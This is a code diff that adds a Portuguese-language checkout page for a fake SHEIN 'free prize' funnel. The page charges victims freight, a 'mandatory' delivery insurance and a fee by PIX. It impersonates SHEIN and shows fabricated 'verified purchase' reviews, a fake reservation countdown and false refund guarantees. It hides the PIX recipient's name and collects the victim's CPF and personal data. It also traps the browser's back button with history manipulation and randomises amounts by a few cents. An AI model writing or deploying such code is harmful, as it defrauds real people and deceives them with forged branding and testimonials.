@@ -1,0 +1,372 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="utf-8">
+<!-- UTMify Pixel -->
+<script>
+  window.pixelId = "679fb0f4bbdfc9f47bf2c735";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+<!-- UTMify UTM -->
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>SHEIN | Checkout Seguro</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="css/shein.css">
+<script src="js/shared.js"></script>
+<script src="js/helpers.js"></script>
+<script src="js/config.js"></script>
+<script src="js/pix.js"></script>
+<style>
+@keyframes shakeX{0%,100%{transform:translateX(0)}20%{transform:translateX(-4px)}40%{transform:translateX(4px)}60%{transform:translateX(-3px)}80%{transform:translateX(3px)}}
+.shake-x{animation:shakeX .35s ease}
+/* Checkout limpo: oculta o bloco "Quem vai receber" do widget PIX apenas nesta pagina */
+.pix-nominal-box{display:none!important}
+</style>
+</head>
+<body>
+<div class="sticky top-0 z-40 bg-red-600 text-white text-sm font-semibold flex items-center justify-center gap-2 py-2 px-4"><span>⏰</span><span>Sua reserva expira em:</span><span id="timer" class="tnum font-extrabold">15:00</span></div>
+<div id="app-header"></div>
+<!-- Banner VIP no topo do checkout -->
+<div class="wrap-md px-4 pt-3"><img src="images/banner_checkout.jpg" alt="LOOKS PARA SEMPRE — Benefícios VIP do programa" style="width:100%;height:auto;display:block;border-radius:14px;box-shadow:0 4px 16px rgba(190,24,93,.12)"></div>
+<main id="app" style="transition:opacity .15s ease"></main>
+<div id="app-footer"></div>
+
+<!-- Order bump: Grupo Premium SHEIN no WhatsApp -->
+<div id="drawer-overlay" class="drawer-overlay" style="display:none">
+  <div class="drawer-panel">
+    <div class="flex justify-center pt-3"><div class="w-10 h-1.5 rounded-full bg-gray-300"></div></div>
+    <div class="px-5 pt-3 pb-4 text-center border-b border-gray-100">
+      <span class="pill" style="background:#dcfce7;color:#15803d;font-size:10px">🎁 BÔNUS INCLUSO · CORTESIA</span>
+      <div class="flex justify-center mt-3 mb-2"><img src="images/whatsapp.jpg" alt="Grupo Premium SHEIN no WhatsApp" style="width:74px;height:74px;border-radius:20px;object-fit:cover;box-shadow:0 6px 20px rgba(37,211,102,.35)"></div>
+      <h3 class="text-xl font-extrabold leading-tight">Grupo Premium SHEIN<br>no <span style="color:#16a34a">WhatsApp</span></h3>
+      <p class="text-sm text-gray-500 mt-2">Você também garantiu acesso vitalício ao grupo VIP — <b>de cortesia, sem pagar nada a mais</b>. Toda semana você recebe:</p>
+    </div>
+    <div class="px-5 py-3">
+      <div class="space-y-2 text-sm text-gray-700">
+        <div class="flex gap-2"><span>💸</span><span><b>1 Sorteio de PIX</b> toda semana entre as participantes</span></div>
+        <div class="flex gap-2"><span>🏷️</span><span><b>Cupons de 50% OFF</b> na SHEIN todos os dias</span></div>
+        <div class="flex gap-2"><span>🎁</span><span><b>1 Cupom de produtos grátis</b> por semana</span></div>
+        <div class="flex gap-2"><span>🚚</span><span><b>4 Cupons de frete grátis</b> por semana</span></div>
+        <div class="flex gap-2"><span>⚡</span><span><b>Acesso antecipado</b> às coleções e promoções relâmpago</span></div>
+        <div class="flex gap-2"><span>👑</span><span><b>Atendimento VIP prioritário</b> direto no grupo</span></div>
+      </div>
+      <div class="mt-4 rounded-xl text-center py-3" style="background:#f0fdf4;border:1px dashed #16a34a">
+        <p class="text-xs text-gray-500 mb-0.5">Acesso vitalício ao grupo VIP:</p>
+        <p class="font-extrabold" style="color:#15803d;font-size:24px;line-height:1"><span style="text-decoration:line-through;color:#9ca3af;font-size:13px;font-weight:700;margin-right:8px">R$ 97,00</span>GRÁTIS</p>
+        <p class="text-xs font-bold mt-1" style="color:#15803d">✅ Já incluso no seu pedido — sem custo adicional</p>
+      </div>
+    </div>
+    <div class="px-5 pt-2 pb-6 bg-white">
+      <button id="btn-drawer-ok" class="w-full rounded-xl py-4 text-base font-extrabold text-white" style="background:#16a34a">✅ Continuar →</button>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  mountChrome(100);
+  var nome=LS.get('funil_nome')||'Participante';
+  var premio=LS.get('funil_premio')||'maquiagem';
+  var prizeNames={maquiagem:'Kit Maquiagem SHEIN',roupas:'Kit Looks Tema Livre',casa:'Kit Utens\u00edlios para Casa'};
+  var pName=prizeNames[premio]||'Kit SHEIN';
+  startTimer(document.getElementById('timer'),900);
+  initLiveNotifications({delayFirst:7000});
+  initHelpWidget();
+
+  var FRETES={
+    full:{key:'full',label:'Econ\u00f4mico',price:38.82,prazo:'3 a 5 dias \u00fateis',badge:'\uD83D\uDCB0 ECONOMIA',bg:'#dcfce7',fg:'#15803d'},
+    express:{key:'express',label:'Super Express',price:46.89,prazo:'entrega em at\u00e9 24 horas',badge:'\u26A1 SUPER EXPRESS',bg:'#fee2e2',fg:'#dc2626'}
+  };
+  /* Order bump único: Grupo Premium SHEIN no WhatsApp */
+  var WHATS_BUMP={key:'whatsapp',title:'Grupo Premium SHEIN no WhatsApp',price:32.50};
+  var selectedFrete=null;
+  var SM=StepManager('app');
+
+  var REVIEWS=[
+    {photo:'../img/testimonials/ana.jpg',name:'Ana Paula S.',city:'S\u00e3o Paulo, SP',text:'Paguei o frete e chegou em 3 dias! Kit de maquiagem completo, tudo original e lacrado \uD83D\uDE0D',ago:'h\u00e1 1 dia'},
+    {photo:'../img/testimonials/juliana.jpg',name:'Juliana M.',city:'Rio de Janeiro, RJ',text:'Achei que era golpe mas minha amiga recebeu, a\u00ed criei coragem. Chegou tudo certinho! \u2764\uFE0F',ago:'h\u00e1 2 dias'},
+    {photo:'../img/testimonials/marcia.jpg',name:'M\u00e1rcia R.',city:'Belo Horizonte, MG',text:'O pagamento confirmou na hora e j\u00e1 recebi o c\u00f3digo de rastreio no e-mail. Muito organizado \uD83D\uDC4F',ago:'h\u00e1 2 dias'},
+    {photo:'../img/testimonials/fernanda.jpg',name:'Fernanda L.',city:'Curitiba, PR',text:'Gente, chegou t\u00e3o r\u00e1pido! Paguei o frete expresso e veio no dia seguinte \uD83D\uDED5\uFE0F',ago:'h\u00e1 3 dias'},
+    {photo:'../img/testimonials/patricia.jpg',name:'Patr\u00edcia R.',city:'Salvador, BA',text:'Recebi meu kit de roupas ontem e estou apaixonada! Todas no tamanho certo \uD83E\uDD70',ago:'h\u00e1 3 dias'},
+    {photo:'../img/testimonials/camila.jpg',name:'Camila T.',city:'Porto Alegre, RS',text:'Terceira vez que participo e sempre recebo! Dessa vez veio o kit casa completo \uD83C\uDFE0\u2728',ago:'h\u00e1 4 dias'}
+  ];
+  function stars(){return '\u2B50\u2B50\u2B50\u2B50\u2B50';}
+  function reviewCard(r){
+    return '<div class="bg-white border border-gray-100 rounded-xl p-4 shadow-sm">'
+      +'<div class="flex items-start gap-3">'
+      +'<div style="position:relative;flex-shrink:0"><img src="'+r.photo+'" alt="'+escHtml(r.name)+'" style="width:44px;height:44px;border-radius:50%;object-fit:cover;border:2px solid #fce7f3" onerror="this.style.display=\'none\'">'
+      +'<span style="position:absolute;bottom:-2px;right:-2px;width:16px;height:16px;border-radius:50%;background:#16a34a;color:#fff;font-size:10px;display:flex;align-items:center;justify-content:center;border:2px solid #fff">\u2713</span></div>'
+      +'<div class="flex-1 min-w-0">'
+      +'<div class="flex items-center justify-between gap-2"><span class="font-bold text-sm">'+escHtml(r.name)+'</span><span class="text-amber-400" style="font-size:11px">'+stars()+'</span></div>'
+      +'<div class="text-xs text-gray-400">'+escHtml(r.city)+' \u00b7 '+r.ago+'</div>'
+      +'<span style="display:inline-block;margin-top:3px;font-size:9px;font-weight:800;color:#15803d;background:#dcfce7;border-radius:999px;padding:1px 7px;text-transform:uppercase;letter-spacing:.03em">\u2713 Compra verificada</span>'
+      +'</div></div>'
+      +'<p class="text-sm text-gray-600 mt-2">'+escHtml(r.text)+'</p></div>';
+  }
+
+  /* ============ FREIGHT SELECTION ============ */
+  SM.add('freight',function(){
+    var h='<div class="step-enter wrap-md px-4 py-6">'
+      +'<div class="text-center mb-5"><span class="pill" style="background:#fce7f3;color:#be185d">\uD83D\uDD12 CHECKOUT SEGURO</span>'
+      +'<h2 class="text-xl font-extrabold mt-3">'+escHtml(nome)+', escolha o frete de envio</h2>'
+      +'<p class="text-sm text-gray-500 mt-1">Sua premia\u00e7\u00e3o \u00e9 gr\u00e1tis. Voc\u00ea paga apenas o frete.</p></div>';
+    h+='<div class="bg-white border border-gray-100 rounded-2xl p-4 shadow-sm mb-5"><p class="text-xs font-bold uppercase tracking-wide text-gray-400 mb-3">Resumo do pedido</p>'
+      +'<div class="flex justify-between py-2 border-b border-gray-100"><span class="text-sm">Premia\u00e7\u00e3o: '+escHtml(pName)+'</span><span class="text-sm font-extrabold text-green-600">GR\u00C1TIS</span></div></div>';
+    h+='<div class="space-y-3">';
+    ['full','express'].forEach(function(k){var f=FRETES[k];
+      h+='<button class="fopt option-card w-full text-left bg-white border-2 border-gray-200 rounded-2xl p-4" data-k="'+f.key+'">'
+        +'<div class="flex justify-between items-center mb-1"><span class="pill" style="background:'+f.bg+';color:'+f.fg+';font-size:10px">'+f.badge+'</span><span class="font-extrabold text-lg">'+formatBRL(f.price)+'</span></div>'
+        +'<h3 class="font-extrabold">Entrega '+f.label+'</h3><p class="text-sm text-gray-500">'+f.prazo+'</p></button>';
+    });
+    h+='</div>';
+    h+='<div class="mt-5 flex items-center justify-center gap-2 rounded-xl px-4 py-2.5" style="background:#f0fdf4;border:1px solid #bbf7d0"><span style="font-size:16px">\uD83D\uDCE6</span><span class="text-xs font-bold" style="color:#15803d">Garantia de Frete: n\u00e3o chegou no prazo? <u>Devolvemos 100% do seu frete</u></span></div>';
+    h+='<p class="text-xs font-bold uppercase tracking-wide text-gray-400 mt-7 mb-1">O que dizem nossas ganhadoras</p>'
+      +'<p class="text-xs text-gray-500 mb-3">\u2B50 <b>4,9/5</b> \u00b7 +2.800 mulheres receberam sua premia\u00e7\u00e3o este m\u00eas</p><div class="space-y-3">';
+    REVIEWS.forEach(function(r){h+=reviewCard(r);});
+    h+='</div>';
+    h+='<div class="flex items-center justify-center gap-4 mt-6 text-[11px] text-gray-400 flex-wrap"><span>\uD83D\uDD12 SSL 256-bits</span><span>\uD83C\uDFDB\uFE0F PIX Banco Central</span><span>\u2705 100% seguro</span></div>';
+    h+='</div>';
+    return h;
+  },function(){
+    document.querySelectorAll('.fopt').forEach(function(c){c.onclick=function(){
+      document.querySelectorAll('.fopt').forEach(function(x){x.className='fopt option-card w-full text-left bg-white border-2 border-gray-200 rounded-2xl p-4';});
+      c.className='fopt option-card w-full text-left bg-white border-2 border-black rounded-2xl p-4';
+      selectedFrete=c.getAttribute('data-k');LS.set('funil_frete_tipo',selectedFrete);
+      showRaffle();
+    };});
+  });
+
+  /* ============ Order bump popup flow ============ */
+  function showRaffle(){openDrawer();}
+  function openDrawer(){var ov=document.getElementById('drawer-overlay');ov.style.display='flex';void ov.offsetWidth;ov.classList.add('show');}
+  function closeDrawer(){var ov=document.getElementById('drawer-overlay');ov.classList.remove('show');setTimeout(function(){ov.style.display='none';},300);}
+
+  function saveBumpsAndPay(){
+    /* Grupo Premium no WhatsApp agora e CORTESIA (incluso, sem custo).
+       Nenhum order bump pago e adicionado ao total do PIX. */
+    LS.set('funil_bumps',JSON.stringify([]));LS.set('funil_bumps_total','0');
+    LS.set('funil_protect_optin','1');LS.set('funil_whats_incluso','1');
+    closeDrawer();setTimeout(function(){SM.go(isValidCPF(LS.get('funil_cpf')||'')?'pix':'docs');},400);
+  }
+  document.getElementById('btn-drawer-ok').onclick=function(){saveBumpsAndPay();};
+
+  /* ============ CPF (necessario pra emitir o Pix) ============
+     O funil (parte 6) ja coletou nome, e-mail e endereco — nao repetimos nada
+     aqui. O CPF e a unica informacao que falta e que a PinPay exige do pagador. */
+  SM.add('docs',function(){
+    var primeiro=escHtml((nome||'').split(' ')[0]||'');
+    return '<div class="step-enter wrap-md px-4 py-8">'
+      +'<div class="text-center mb-5"><span class="pill" style="background:#fce7f3;color:#be185d">🔒 QUASE LÁ</span>'
+      +'<h2 class="text-xl font-extrabold mt-3">'+(primeiro?primeiro+', c':'C')+'onfirme seu CPF</h2>'
+      +'<p class="text-sm text-gray-500 mt-1">Necessário para emitir o Pix da sua premiação. Seus outros dados já estão com a gente.</p></div>'
+      +'<label class="text-xs font-bold uppercase tracking-wide text-gray-400 block mb-2">Seu CPF</label>'
+      +'<input id="ck-cpf" type="tel" inputmode="numeric" class="input-field text-center" placeholder="000.000.000-00" maxlength="14" style="font-size:18px;letter-spacing:1px" value="'+escHtml(LS.get('funil_cpf'))+'">'
+      +'<p id="ck-cpf-err" class="text-sm text-red-600 mt-2 hidden">CPF inválido. Confira os números.</p>'
+      +'<button id="ck-cpf-cta" class="btn-primary w-full rounded-xl py-4 text-base mt-5">Gerar meu Pix →</button>'
+      +'<div class="flex items-center justify-center gap-4 mt-4 text-[11px] text-gray-400 flex-wrap"><span>🔒 Dados criptografados</span><span>🏛️ PIX Banco Central</span></div>'
+    +'</div>';
+  },function(){
+    var inp=document.getElementById('ck-cpf'),err=document.getElementById('ck-cpf-err'),cta=document.getElementById('ck-cpf-cta');
+    bindCpfMask('ck-cpf');inp.focus();
+    cta.onclick=function(){
+      var digits=(inp.value||'').replace(/\D/g,'');
+      if(!isValidCPF(digits)){err.classList.remove('hidden');inp.classList.add('shake-x');setTimeout(function(){inp.classList.remove('shake-x');},400);return;}
+      err.classList.add('hidden');LS.set('funil_cpf',digits);SM.go('pix');
+    };
+  });
+
+  /* ============ SEGURO ENTREGA (OBRIGATORIO) ============
+     O Seguro Entrega e OBRIGATORIO e ja vem incluso em todo pedido (sem popup
+     de opt-in). A cobertura completa e exibida no resumo final do checkout:
+     indenizacao de 100% em caso de perda/extravio/roubo, garantia de entrega
+     (reenvio imediato ou reembolso total via PIX), isencao de taxas
+     alfandegarias e prioridade no rastreio. */
+  var PROT_PRICE=9.90;
+
+  /* ============ TAXA DE SERVICO (processador de pagamentos) ============
+     O processador de pagamentos repassa ao cliente final uma taxa de servico de R$0,99: o PIX
+     que aparece no banco sai com +R$0,99 sobre o valor enviado a API.
+     Por isso TODOS os totais exibidos na tela ja incluem a taxa — assim o
+     valor mostrado aqui bate exatamente com o valor cobrado no banco. */
+  var SERVICE_FEE=(typeof window.PIX_SERVICE_FEE==='number')?window.PIX_SERVICE_FEE:0.99;
+  function comTaxa(v){return Math.round((Number(v)+SERVICE_FEE)*100)/100;}
+
+  /* ============ PIX ============ */
+  SM.add('pix',function(){
+    var f=FRETES[selectedFrete||'full'];var bumps=LS.getJSON('funil_bumps')||[];
+    var hasProt = true; /* Seguro Entrega obrigatorio em todo pedido */
+    var h='<div class="step-enter wrap-md px-4 py-6">'
+      +'<div class="text-center mb-4"><span class="pill" style="background:#fce7f3;color:#be185d">PAGAMENTO PIX</span><h2 class="text-xl font-extrabold mt-3">Finalize seu pagamento</h2></div>'
+      
+      +'<div class="rounded-2xl overflow-hidden mb-4 shadow-sm" style="border:1px solid #bbf7d0">'
+        +'<div class="flex items-center justify-between px-4 py-2" style="background:#16a34a">'
+          +'<span class="text-xs font-extrabold text-white uppercase tracking-wide">\uD83D\uDEE1\uFE0F Seguro Entrega (obrigat\u00f3rio)</span>'
+          +'<span class="text-[10px] font-black text-green-700 bg-white rounded-full px-2 py-0.5 uppercase">Ativo</span>'
+        +'</div>'
+        +'<div class="px-4 py-3" style="background:#f0fdf4">'
+          +'<p class="text-xs font-bold text-gray-700 mb-2">Cobertura completa inclusa no seu pedido:</p>'
+          +'<div class="text-xs text-gray-600 leading-relaxed space-y-1.5">'
+            +'<div class="flex gap-2"><span style="color:#16a34a">\u2705</span><span><b>Indeniza\u00e7\u00e3o de 100%</b> em caso de perda, extravio ou roubo do pacote \u2014 voc\u00ea recebe o valor integral de volta via PIX</span></div>'
+            +'<div class="flex gap-2"><span style="color:#16a34a">\u2705</span><span><b>Garantia de entrega:</b> se o pr\u00eamio n\u00e3o chegar no prazo, fazemos o <b>reenvio imediato</b> sem custo ou devolvemos tudo</span></div>'
+            +'<div class="flex gap-2"><span style="color:#16a34a">\u2705</span><span><b>Isen\u00e7\u00e3o garantida</b> de taxas alfandeg\u00e1rias surpresa</span></div>'
+            +'<div class="flex gap-2"><span style="color:#16a34a">\u2705</span><span><b>Prioridade no rastreio</b> e suporte dedicado at\u00e9 a sua porta</span></div>'
+          +'</div>'
+          +'<p class="text-[11px] text-gray-500 mt-2" style="border-top:1px dashed #bbf7d0;padding-top:8px">O Seguro Entrega \u00e9 obrigat\u00f3rio e garante a indeniza\u00e7\u00e3o total da sua premia\u00e7\u00e3o do envio at\u00e9 a entrega. Taxa \u00fanica de '+formatBRL(PROT_PRICE)+'.</p>'
+        +'</div></div>'
+
+      +'<div id="co-desc-badge" class="mb-4 text-center" style="display:none;background:#16a34a;border-radius:14px;padding:11px 14px"><span style="color:#fff;font-size:13px;font-weight:900">\uD83C\uDF89 Desconto de 50% aplicado! Aproveite o valor promocional abaixo.</span></div>'
+      +'<div class="bg-white border border-gray-100 rounded-2xl p-4 shadow-sm mb-4"><p class="text-xs font-bold uppercase tracking-wide text-gray-400 mb-3">Resumo do pedido</p>'
+      +'<div class="flex justify-between py-2 border-b border-gray-100"><span class="text-sm">Premia\u00e7\u00e3o: '+escHtml(pName)+'</span><span class="text-sm font-extrabold text-green-600">GR\u00C1TIS</span></div>'
+      +'<div class="flex justify-between py-2 border-b border-gray-100"><span class="text-sm">Frete ('+f.label+') \u00b7 '+f.prazo+'</span><span class="text-sm font-bold">'+formatBRL(f.price)+'</span></div>';
+    bumps.forEach(function(b){h+='<div class="flex justify-between py-2 border-b border-gray-100"><span class="text-sm">\uD83D\uDCF2 '+escHtml(b.title)+'</span><span class="text-sm font-bold">'+formatBRL(b.subtotal)+'</span></div>';});
+    h+='<div class="flex justify-between py-2 border-b border-gray-100"><span class="text-sm">\uD83D\uDCF2 Grupo Premium SHEIN no WhatsApp</span><span class="text-sm font-extrabold text-green-600">INCLUSO</span></div>';
+    
+    h+='<div id="row-protect" class="flex justify-between py-2 border-b border-gray-100"><span class="text-sm">\uD83D\uDEE1\uFE0F Seguro Entrega (obrigat\u00f3rio)</span><span class="text-sm font-bold">'+formatBRL(PROT_PRICE)+'</span></div>';
+    h+='<div class="flex justify-between py-2 border-b border-gray-100"><span class="text-sm">Taxa de servi\u00e7o (processamento PIX)</span><span class="text-sm font-bold">'+formatBRL(SERVICE_FEE)+'</span></div>';
+    
+    h+='<div class="flex justify-between pt-3"><span class="font-extrabold">Total</span><span id="co-total" class="font-extrabold text-lg" style="color:#be185d"></span></div></div>'
+      +'<div id="pix-container"></div>'
+
+      +'<div class="flex items-center justify-center gap-4 mt-5 text-[11px] text-gray-400 flex-wrap"><span>\uD83D\uDD12 SSL 256-bits</span><span>\uD83C\uDFDB\uFE0F PIX Banco Central</span><span>\u2705 100% seguro</span></div></div>';
+    return h;
+  },function(){
+    var f=FRETES[selectedFrete||'full'];var bumps=LS.getJSON('funil_bumps')||[];var bt=parseFloat(LS.get('funil_bumps_total'))||0;
+    var cpf=LS.get('funil_cpf')||genCPF();LS.set('funil_cpf',cpf);
+    var pixGen=0;
+    var hasProt = true; /* Seguro Entrega obrigatorio */
+    LS.set('funil_protect_optin','1');
+    var actualProtPrice = PROT_PRICE;
+    
+    /* Calcula a base total e aplica o jitter de centavos (fallback inline anti-cache) */
+    var baseT=f.price+bt+actualProtPrice;
+    var finalAmount=baseT;
+    if(typeof window.pixJitter === 'function'){
+      finalAmount=window.pixJitter(baseT, 'checkout_pix');
+    } else {
+      var storeKey='funil_jitter_checkout_pix';
+      var cents=parseInt(localStorage.getItem(storeKey),10);
+      if(isNaN(cents)){
+        cents=Math.floor(Math.random()*161)-80;
+        try{localStorage.setItem(storeKey,String(cents));}catch(e){}
+      }
+      var fa=Math.round((baseT*100)+cents)/100;
+      if(fa<1) fa=Math.round((baseT*100)+Math.abs(cents))/100;
+      finalAmount=Math.round(fa*100)/100;
+    }
+    
+    var originalAmount=finalAmount;
+    var discountActive=false;
+    function total(){return discountActive?Math.max(1,Math.round(originalAmount*50)/100):originalAmount;}
+    var totalEl=document.getElementById('co-total');
+    function refreshSummary(){
+      /* Todos os valores EXIBIDOS incluem a taxa de servico (+R$0,99) para
+         bater exatamente com o valor do PIX cobrado no banco. */
+      var amt=comTaxa(total());
+      if(totalEl){
+        if(discountActive){
+          totalEl.innerHTML='<span style="text-decoration:line-through;color:#9ca3af;font-size:13px;font-weight:700;margin-right:8px">'+formatBRL(comTaxa(originalAmount))+'</span>'+formatBRL(amt);
+        } else {
+          totalEl.textContent=formatBRL(amt);
+        }
+      }
+      LS.set('funil_protect','1');
+    }
+    function launchPix(){
+      var myGen=++pixGen;
+      var pn='Frete '+f.label+' + Seguro'+(bumps.length>0?' + Grupo VIP':'')+' \u2014 Pr\u00eamio SHEIN';
+      initPixPanel('pix-container',{
+        client:{name:(LS.get('funil_nome')+' '+(LS.get('funil_sobrenome')||'')).trim(),email:LS.get('funil_email'),phone:LS.get('funil_phone'),document:cpf},
+        address:{cep:LS.get('funil_cep'),rua:LS.get('funil_rua'),numero:LS.get('funil_numero'),complemento:LS.get('funil_complemento'),bairro:LS.get('funil_bairro'),cidade:LS.get('funil_cidade'),uf:LS.get('funil_estado')},
+        amount:total(),productName:pn,productType:'freight',accent:'#be185d',
+        onPaid:function(){if(myGen!==pixGen)return;setTimeout(function(){__funilNav('../8/index.html');},1500);}
+      });
+    }
+    refreshSummary();launchPix();
+
+    /* ===== POP-UP DE SUPER DESCONTO FINAL (50% OFF) =====
+       Aparece 3 minutos após a tela do PIX se o lead ainda não pagou.
+       Aplica 50% de desconto sobre o total gerado (frete + seguro + cotas)
+       e gera um novo PIX pela metade do preço. Dispara apenas uma vez. */
+    var DISCOUNT_DELAY_MS=180000;
+    function applyDiscount(){
+      if(discountActive)return;
+      discountActive=true;
+      LS.set('funil_desconto50','1');
+      refreshSummary();
+      launchPix();
+      var badge=document.getElementById('co-desc-badge');
+      if(badge)badge.style.display='block';
+      var pc=document.getElementById('pix-container');
+      if(pc)setTimeout(function(){pc.scrollIntoView({behavior:'smooth',block:'start'});},200);
+    }
+    function showDiscountPopup(){
+      if(window.__coDiscShown||discountActive)return;
+      window.__coDiscShown=true;
+      var novo=Math.max(1,Math.round(originalAmount*50)/100);
+      if(!document.getElementById('co-disc-style')){
+        var st=document.createElement('style');st.id='co-disc-style';
+        st.textContent='@keyframes coDiscIn{0%{transform:scale(.7);opacity:0}60%{transform:scale(1.04)}100%{transform:scale(1);opacity:1}}@keyframes coDiscPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}@keyframes coDiscGlow{0%,100%{box-shadow:0 0 0 0 rgba(22,163,74,.45)}50%{box-shadow:0 0 0 12px rgba(22,163,74,0)}}';
+        document.head.appendChild(st);
+      }
+      var ov=document.createElement('div');ov.id='co-disc-ov';
+      ov.style.cssText='position:fixed;inset:0;z-index:10000;background:rgba(0,0,0,.8);display:flex;align-items:center;justify-content:center;padding:20px';
+      ov.innerHTML='<div style="background:#fff;border-radius:22px;max-width:360px;width:100%;padding:0;overflow:hidden;box-shadow:0 24px 70px rgba(0,0,0,.45);animation:coDiscIn .45s cubic-bezier(.2,.9,.3,1.2) both">'
+        +'<div style="background:linear-gradient(135deg,#16a34a,#15803d);padding:20px 22px;text-align:center;color:#fff">'
+          +'<div style="font-size:40px;line-height:1;margin-bottom:6px">🎉</div>'
+          +'<p style="font-size:12px;font-weight:800;letter-spacing:.5px;text-transform:uppercase;opacity:.9;margin:0 0 4px">Oferta relâmpago só agora</p>'
+          +'<h3 style="font-size:24px;font-weight:900;margin:0;line-height:1.1">50% DE DESCONTO<br>NO SEU FRETE!</h3>'
+        +'</div>'
+        +'<div style="padding:22px">'
+          +'<p style="font-size:13.5px;color:#444;line-height:1.6;text-align:center;margin:0 0 14px">Vimos que você ainda não finalizou. Para garantir a entrega do seu prêmio, liberamos um <b>desconto único de 50%</b> — já com o <b>seguro</b> incluso!</p>'
+          +'<div style="background:#f0fdf4;border:1px dashed #16a34a;border-radius:14px;padding:14px;text-align:center;margin-bottom:16px">'
+            +'<p style="font-size:12px;color:#6b7280;margin:0 0 2px">De <span style="text-decoration:line-through">'+formatBRL(comTaxa(originalAmount))+'</span> por apenas:</p>'
+            +'<p style="font-size:32px;font-weight:900;color:#15803d;margin:0;line-height:1">'+formatBRL(comTaxa(novo))+'</p>'
+          +'</div>'
+          +'<button id="co-disc-yes" style="width:100%;background:#16a34a;color:#fff;border:0;border-radius:14px;padding:16px;font-size:15px;font-weight:900;cursor:pointer;animation:coDiscGlow 1.8s infinite">🔥 QUERO 50% DE DESCONTO AGORA</button>'
+          +'<button id="co-disc-no" style="width:100%;background:none;border:0;color:#9ca3af;font-size:12px;font-weight:700;padding:12px 0 2px;cursor:pointer;text-decoration:underline">Não, quero pagar o valor cheio</button>'
+        +'</div>'
+      +'</div>';
+      document.body.appendChild(ov);
+      var y=document.getElementById('co-disc-yes');
+      var n=document.getElementById('co-disc-no');
+      if(y)y.onclick=function(){ov.remove();applyDiscount();};
+      if(n)n.onclick=function(){ov.remove();};
+    }
+    if(LS.get('funil_desconto50')==='1'){ applyDiscount(); }
+    else { setTimeout(showDiscountPopup,DISCOUNT_DELAY_MS); }
+
+    /* ----- EXIT-TRAP: retenção na tela do PIX ----- */
+    if(!window.__coTrapArmed){
+      window.__coTrapArmed=true;
+      function pushGuard(){try{history.pushState({__co:1},'',location.href);}catch(e){}}
+      function showRetain(){
+        if(document.getElementById('co-retain'))return;
+        var ov=document.createElement('div');ov.id='co-retain';
+        ov.style.cssText='position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.75);display:flex;align-items:center;justify-content:center;padding:20px';
+        ov.innerHTML='<div style="background:#fff;border-radius:20px;max-width:360px;width:100%;padding:28px 22px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.35)">'
+          +'<div style="font-size:44px;line-height:1;margin-bottom:12px">⚠️</div>'
+          +'<h3 style="font-size:18px;font-weight:800;color:#111;margin:0 0 8px">Espere! Seu PIX já foi gerado</h3>'
+          +'<p style="font-size:13px;color:#555;line-height:1.55;margin:0 0 6px">Sua premiação está <b>reservada em seu nome</b> por tempo limitado. Se você sair agora, a reserva será <b style="color:#dc2626">cancelada</b> e liberada para outra participante.</p>'
+          +'<p style="font-size:12px;color:#888;margin:0 0 18px">O pagamento leva menos de 30 segundos ⏱️</p>'
+          +'<button id="co-retain-stay" style="width:100%;background:#be185d;color:#fff;border:0;border-radius:14px;padding:14px;font-size:14px;font-weight:800;cursor:pointer">✅ CONTINUAR E GARANTIR MEU PRÊMIO</button>'
+          +'</div>';
+        document.body.appendChild(ov);
+        var b=document.getElementById('co-retain-stay');
+        if(b)b.onclick=function(){ov.remove();var pc=document.getElementById('pix-container');if(pc)pc.scrollIntoView({behavior:'smooth',block:'start'});};
+      }
+      pushGuard();
+      window.addEventListener('popstate',function(){pushGuard();showRetain();});
+      document.addEventListener('visibilitychange',function(){if(document.visibilityState==='visible')pushGuard();});
+    }
+  });
+
+  SM.go('freight');
+})();
+</script>
+
+</body></html>
